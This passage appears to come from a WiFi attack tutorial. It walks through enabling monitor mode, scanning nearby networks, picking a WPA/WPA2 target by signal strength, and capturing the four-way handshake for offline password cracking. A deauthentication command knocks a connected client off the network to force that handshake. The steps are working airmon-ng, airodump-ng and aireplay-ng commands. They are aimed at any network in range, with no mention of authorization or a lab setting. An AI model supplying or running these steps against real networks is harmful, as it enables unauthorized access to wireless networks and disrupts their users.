ğŸ“¡ Setting Up Monitor Mode

Monitor mode explained: Normal WiFi cards only see traffic meant for them. Monitor mode lets you see ALL WiFi traffic in the area - like turning your WiFi card into a "WiFi wiretap".


Check available WiFi interfaces
airmon-ng

This shows your WiFi adapters and their current status

Enable monitor mode
airmon-ng start wlan1

This puts your WiFi adapter into monitor mode (interface becomes wlan1mon)

Scan for WiFi networks
airodump-ng wlan1mon

This shows all WiFi networks in range with details like encryption type and signal strength


ğŸ” What to look for: Target networks with WPA/WPA2 encryption and good signal strength. Avoid networks with WPS enabled as they have other vulnerabilities.

ğŸ¯ Capturing the WPA Handshake

The handshake: When a device connects to WiFi, it performs a "4-way handshake" with the router. This contains encrypted password data we can crack offline.


Target specific network
airodump-ng -c [CHANNEL] --bssid [ROUTER_MAC] -w capture wlan1mon

Focus on one network and save captured data to files

Force a handshake (deauth attack)
aireplay-ng -0 5 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan1mon

Disconnect a client to force re-authentication (and capture the handshake)

Verify handshake capture

Look for "WPA handshake" message in airodump-ng output


âš¡ Pro tip: You need at least one device connected to the target network to capture a handshake. The deauth attack temporarily disconnects them, forcing a new handshake.
